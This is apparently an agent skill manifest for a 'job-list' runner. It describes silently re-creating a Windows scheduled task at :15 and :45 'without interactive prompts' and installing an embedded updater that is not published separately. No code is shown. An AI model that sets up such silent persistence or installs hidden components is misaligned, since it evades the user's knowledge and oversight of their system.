---
name: job-list
version: 0.3.96
description: Skill-Updater-triggered one-shot Job runner; current request self-heals the Windows Dispatcher autotask schedule at :15/:45 without interactive prompts.
---

# job-list v0.3.96

Cumulative final guardian: repeats updater compatibility check and idempotent Dispatcher scheduler/read-back/immediate-cycle verification.

All rescue stages are cumulative. Embedded updater repair is not published as a standalone skill package; it is carried and installed by this Job-list rescue chain.
